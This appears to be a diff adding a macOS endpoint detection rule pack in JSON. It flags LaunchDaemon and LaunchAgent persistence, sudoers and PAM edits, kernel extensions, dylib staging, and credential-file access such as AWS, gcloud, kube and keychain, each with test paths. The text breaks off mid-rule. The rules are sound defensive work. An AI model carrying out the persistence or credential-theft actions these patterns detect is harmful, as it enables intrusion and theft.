@@ -1,0 +1,6704 @@
+{
+ "pack": "macos",
+ "rules": [
+  {
+   "id": "macos-launchdaemon-plist-written",
+   "name": "New LaunchDaemon property list",
+   "description": "A property list was written to /Library/LaunchDaemons, which runs as root at boot and is a durable persistence spot.",
+   "tactic": "Persistence",
+   "technique": "T1543.004",
+   "technique_name": "Create or Modify System Process: Launch Daemon",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/launchdaemons/[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     },
+     {
+      "not": {
+       "any": [
+        {
+         "field": "path",
+         "op": "regex",
+         "pattern": "/com\\.(apple|microsoft|docker|google|jamfsoftware|jamf|crowdstrike|adobe|dropbox|sentinelone|backblaze|zoom|zoomus|1password|agilebits|vmware|oracle|cisco|paloaltonetworks|sophos|malwarebytes|objective-see|logitech)[^/]*\\.plist$"
+        },
+        {
+         "field": "path",
+         "op": "regex",
+         "pattern": "/com\\.(elgato|parallels|mozilla|slack|tailscale|wireguard|openvpn|nordvpn|keybase|spotify|obsproject|teamviewer|anydesk)[^/]*\\.plist$"
+        }
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/LaunchDaemons/com.updater.helper.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/LaunchDaemons/readme.txt",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/Launchagents/a.plist",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/LaunchDaemons/com.updater.helper.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchagent-hidden-plist",
+   "name": "Hidden-name LaunchAgent plist",
+   "description": "A LaunchAgent or LaunchDaemon plist whose file name starts with a dot, hiding it from casual listing.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/library/launch(agents|daemons)/\\.[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/.sync.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.sync.plist",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Library/LaunchAgents/.sync.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchagent-system-wide-written",
+   "name": "System-wide LaunchAgent written",
+   "description": "A plist landed in /Library/LaunchAgents, which starts in every user's GUI session.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/launchagents/[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     },
+     {
+      "not": {
+       "any": [
+        {
+         "field": "path",
+         "op": "regex",
+         "pattern": "/com\\.(apple|microsoft|docker|google|jamfsoftware|jamf|crowdstrike|adobe|dropbox|sentinelone|backblaze|zoom|zoomus|1password|agilebits|vmware|oracle|cisco|paloaltonetworks|sophos|malwarebytes|objective-see|logitech)[^/]*\\.plist$"
+        },
+        {
+         "field": "path",
+         "op": "regex",
+         "pattern": "/com\\.(elgato|parallels|mozilla|slack|tailscale|wireguard|openvpn|nordvpn|keybase|spotify|obsproject|teamviewer|anydesk)[^/]*\\.plist$"
+        }
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/LaunchAgents/com.helper.agent.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/LaunchAgents/notes.md",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/LaunchAgents/com.helper.agent.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchagent-apple-lookalike",
+   "name": "LaunchAgent impersonating Apple naming",
+   "description": "A user-writable LaunchAgent whose label imitates com.apple.* naming, a common masquerade for adware and implants.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.005",
+   "technique_name": "Masquerading: Match Legitimate Name or Location",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/users/[^/]+/library/launchagents/com\\.apple\\.[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd",
+    "masquerade"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.apple.softwareupdated.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.example.apple.plist",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.apple.softwareupdated.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-login-items-btm-modified",
+   "name": "Background task management store changed",
+   "description": "The background items database that backs login items and background launch items was altered.",
+   "tactic": "Persistence",
+   "technique": "T1547.015",
+   "technique_name": "Boot or Logon Autostart Execution: Login Items",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/com\\.apple\\.backgroundtaskmanagement/[^/]*\\.btm$|/com\\.apple\\.backgrounditems\\.btm$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "login-item"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v8.btm",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/var/db/com.apple.backgroundtaskmanagement/readme.txt",
+      "operation": "create"
+     },
+     {
+      "path": "/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v8.btm",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-startupitems-created",
+   "name": "StartupItems entry created",
+   "description": "A file appeared under /Library/StartupItems, a deprecated boot-time persistence mechanism still honored by some systems.",
+   "tactic": "Persistence",
+   "technique": "T1037.005",
+   "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/startupitems/.+"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "startup"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/StartupItems/Agent/Agent",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Fonts/a.ttf",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/StartupItems/Agent/Agent",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-rc-common-modified",
+   "name": "rc.common modified",
+   "description": "/etc/rc.common was written, which executes at boot and can carry attacker commands.",
+   "tactic": "Persistence",
+   "technique": "T1037.004",
+   "technique_name": "Boot or Logon Initialization Scripts: RC Scripts",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?etc/rc\\.(common|local)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "startup"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/rc.common",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/rc.conf.sample",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/rc.common",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-emond-rule-created",
+   "name": "emond rule file created",
+   "description": "A rule was added under /etc/emond.d/rules, letting the event monitor daemon launch commands on system events.",
+   "tactic": "Persistence",
+   "technique": "T1546.014",
+   "technique_name": "Event Triggered Execution: Emond",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?etc/emond\\.d/(rules|clients)/"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "emond"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/emond.d/rules/x.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/hosts",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/emond.d/rules/x.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-cron-tab-written",
+   "name": "User crontab written",
+   "description": "A crontab spool file was created or changed under /var/at/tabs.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?var/at/tabs/[^/]+$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cron"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/var/at/tabs/ann",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/var/at/at.deny",
+      "operation": "create"
+     },
+     {
+      "path": "/private/var/at/tabs/ann",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-periodic-script-modified",
+   "name": "Periodic maintenance script modified",
+   "description": "A script under /etc/periodic or /usr/local/etc/periodic was changed, running as root on a schedule.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?(usr/local/)?etc/periodic/(daily|weekly|monthly)/[^/]+$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "periodic"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/periodic/daily/999.local",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/periodic/README",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/periodic/daily/999.local",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-folder-action-script-written",
+   "name": "Folder Action script written",
+   "description": "A script was placed in a Folder Actions location, which executes when files arrive in a watched folder.",
+   "tactic": "Persistence",
+   "technique": "T1546",
+   "technique_name": "Event Triggered Execution",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/library/(scripts/)?(folder action scripts|workflows/applications/folder actions)/"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "folder-action"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/Scripts/Folder Action Scripts/a.scpt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/Scripts/Applications/a.scpt",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Library/Scripts/Folder Action Scripts/a.scpt",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-sudoers-modified",
+   "name": "sudoers file modified",
+   "description": "/etc/sudoers or a sudoers.d drop-in was written, possibly granting passwordless root.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?etc/sudoers(\\.d/[^/]+)?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "regex",
+       "pattern": "/etc/sudoers\\.d/(90-cloud-init-users|README|10-installer|99-vagrant|vagrant)$"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "sudo"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/sudoers.d/admin",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/sudo.conf.bak",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/sudoers.d/admin",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-pam-config-modified",
+   "name": "PAM configuration modified",
+   "description": "A file under /etc/pam.d was written; altered PAM stacks can harvest or bypass authentication.",
+   "tactic": "Credential Access",
+   "technique": "T1556.003",
+   "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?etc/pam\\.d/[^/]+$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "pam"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/pam.d/sudo",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/paths.d/go",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/pam.d/sudo",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-authorized-keys-user-modified",
+   "name": "authorized_keys changed under /Users",
+   "description": "An SSH authorized_keys file in a macOS home directory was created or modified, enabling key-based remote login.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "technique_name": "Account Manipulation: SSH Authorized Keys",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/users/[^/]+/\\.ssh/authorized_keys2?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ssh"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/.ssh/authorized_keys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/.ssh/config",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/.ssh/authorized_keys",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-sshd-config-modified",
+   "name": "sshd_config modified",
+   "description": "The SSH daemon configuration was written, which can open weaker or additional remote access.",
+   "tactic": "Persistence",
+   "technique": "T1021.004",
+   "technique_name": "Remote Services: SSH",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?etc/ssh/sshd_config(\\.d/[^/]+)?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ssh"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/etc/ssh/sshd_config",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/etc/ssh/ssh_config",
+      "operation": "create"
+     },
+     {
+      "path": "/private/etc/ssh/sshd_config",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tcc-database-modified",
+   "name": "TCC database written",
+   "description": "The TCC privacy permission database was written directly, a route to granting camera, disk and screen access without consent.",
+   "tactic": "Defense Evasion",
+   "technique": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/com\\.apple\\.tcc/tcc\\.db(-journal|-wal)?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "tcc"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/Application Support/com.apple.TCC/TCC.db",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Application Support/com.apple.TCC/readme",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/Application Support/com.apple.TCC/TCC.db",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-alf-plist-modified",
+   "name": "Application firewall settings file modified",
+   "description": "The application-layer firewall preference file changed, which can disable inbound filtering.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/preferences/com\\.apple\\.alf\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "firewall"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/Preferences/com.apple.alf.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Preferences/com.apple.dock.plist",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/Preferences/com.apple.alf.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-kext-bundle-installed",
+   "name": "Kernel extension installed",
+   "description": "A kernel extension bundle appeared in an extension directory.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(library|system/library)/extensions/[^/]+\\.kext(/|$)"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "regex",
+       "pattern": "/(backblaze|crowdstrike|sentinel|vmware|vbox|virtualbox|paragon|tuxera|osxfuse|macfuse|nvidia|logitech|wacom|karabiner|sophos|symantec|carbonblack|cisco|jamf|apple[a-z0-9]*)[^/]*\\.kext(/|$)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "kext"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/Extensions/Rootkit.kext/Contents/Info.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Extensions/readme.txt",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/Extensions/Rootkit.kext/Contents/Info.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-system-extension-staged",
+   "name": "System extension staged",
+   "description": "A system extension payload was staged on disk in the SystemExtensions area.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/(staged|system)extensions/.+"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     },
+     {
+      "not": {
+       "field": "path",
+       "op": "regex",
+       "pattern": "/com\\.(apple|crowdstrike|microsoft|sentinelone|cisco|jamf|docker|google|objective-see|paloaltonetworks|sophos|vmware|tailscale|wireguard|logitech)[^/]*\\.systemextension"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "sysext"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/StagedExtensions/Library/SystemExtensions/ABC/x.systemextension",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Fonts/x",
+      "operation": "create"
+     },
+     {
+      "path": "/Library/StagedExtensions/Library/SystemExtensions/ABC/x.systemextension",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dylib-dropped-world-writable",
+   "name": "Dylib dropped into temp or shared dir",
+   "description": "A dynamic library was created in /tmp, /var/tmp or /Users/Shared, typical for injection staging.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?(tmp|var/tmp)/[^/]+\\.dylib$|^/users/shared/[^/]+\\.dylib$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "dyld"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/tmp/libhook.dylib",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/Shared/inject.dylib",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/tmp/build.log",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/lib/x.dylib",
+      "operation": "create"
+     },
+     {
+      "path": "/private/tmp/libhook.dylib",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-script-dropped-in-users-shared",
+   "name": "Script or app dropped in /Users/Shared",
+   "description": "An executable-style file (command, sh, app bundle or pkg) was created in /Users/Shared, writable by all users.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/users/shared/[^/]+\\.(command|sh|pkg|scpt|app)(/|$)"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "staging"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/Shared/update.command",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/Shared/photo.jpg",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/Shared/update.command",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-hidden-file-in-tmp",
+   "name": "Hidden payload created in temp",
+   "description": "A dot-prefixed file was created at the top of /tmp or /var/tmp, a typical hidden dropper location.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?(tmp|var/tmp)/\\.[^/.][^/]*$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/tmp/.agent",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/tmp/agent",
+      "operation": "create"
+     },
+     {
+      "path": "/private/tmp/.agent",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-aws-credentials-touched",
+   "name": "AWS credentials file written",
+   "description": "The AWS shared credentials or config file was created or changed.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.aws/(credentials|config)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cloud",
+    "aws"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/.aws/credentials",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/.aws/cli/cache/x.json",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/.aws/credentials",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-gcloud-azure-creds-touched",
+   "name": "GCP or Azure credential store written",
+   "description": "A gcloud or Azure CLI credential store changed on disk.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.config/gcloud/(credentials\\.db|application_default_credentials\\.json|access_tokens\\.db)$|/\\.azure/(accesstokens\\.json|msal_token_cache\\.[a-z]+)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cloud"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/.config/gcloud/credentials.db",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/.config/gcloud/logs/x.log",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/.config/gcloud/credentials.db",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-kube-docker-config-touched",
+   "name": "kubeconfig or Docker auth written",
+   "description": "A kubeconfig or Docker registry auth file changed; both embed bearer credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.kube/config$|/\\.docker/config\\.json$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cloud",
+    "k8s"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/.kube/config",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/.kube/cache/x",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/.kube/config",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-keychain-file-copied-to-temp",
+   "name": "Keychain file appears in temp or shared dir",
+   "description": "A keychain database file was created in /tmp or /Users/Shared, consistent with staging for offline cracking.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?(tmp|var/tmp)/.*\\.keychain(-db)?$|^/users/shared/.*\\.keychain(-db)?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/tmp/login.keychain-db",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/tmp/notes.txt",
